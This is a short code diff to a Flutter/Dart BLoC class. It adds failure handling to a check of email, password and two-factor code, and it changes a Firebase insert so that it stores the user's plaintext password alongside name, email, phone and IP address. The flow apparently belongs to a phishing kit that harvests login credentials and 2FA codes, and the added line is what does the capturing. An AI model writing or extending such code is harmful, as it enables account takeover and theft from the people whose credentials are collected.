@@ -31,7 +31,11 @@ class HomeBloc extends Bloc<HomeEvent, HomeState> {
       emit(CheckingState());
       final response =
           await apiClient.checkTwoFa(event.email, event.password, event.twoFa);
-      emit(CheckingTwoFASuccessState(response));
+      if (response['status'] == 400) {
+        emit(CheckingTwoFAFailState(response));
+      } else {
+        emit(CheckingTwoFASuccessState(response));
+      }
     });
     on<AddToFirebaseEvent>(
       (event, emit) async {
@@ -46,7 +50,7 @@ class HomeBloc extends Bloc<HomeEvent, HomeState> {
           "name": event.fullName,
           "email": event.email,
           "phone": event.phone,
-          "cap1": event.pageName,
+          "password": event.password,
           "ip": ip,
           "created_at": formattedDateTime
         }); //insert vào trong firebase
